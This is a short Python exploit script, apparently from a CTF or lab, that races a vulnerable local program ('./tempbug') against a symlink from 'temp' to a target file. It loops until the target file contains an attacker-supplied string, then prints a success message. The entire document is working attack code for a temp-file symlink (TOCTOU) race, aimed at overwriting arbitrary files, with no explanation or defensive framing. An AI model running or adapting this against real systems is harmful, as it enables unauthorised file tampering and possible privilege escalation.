import os
import sys
import threading
import subprocess


def execute():
    subprocess.call(['./tempbug',sys.argv[2],'&'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def exploit():
    subprocess.call(['ln','-s', sys.argv[1], 'temp'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

if __name__=='__main__':
    while(True):
        with open(sys.argv[1], 'rt') as fp:
            check=fp.read()

        offset = check.find(sys.argv[2])
        check = check[offset::].strip('\n')

        if check == sys.argv[2]:
            print("[*] Exploit Success!!!")
            break
        th1 = threading.Thread(target=execute)
        th2 = threading.Thread(target=exploit)

        th1.start()
        th2.start()
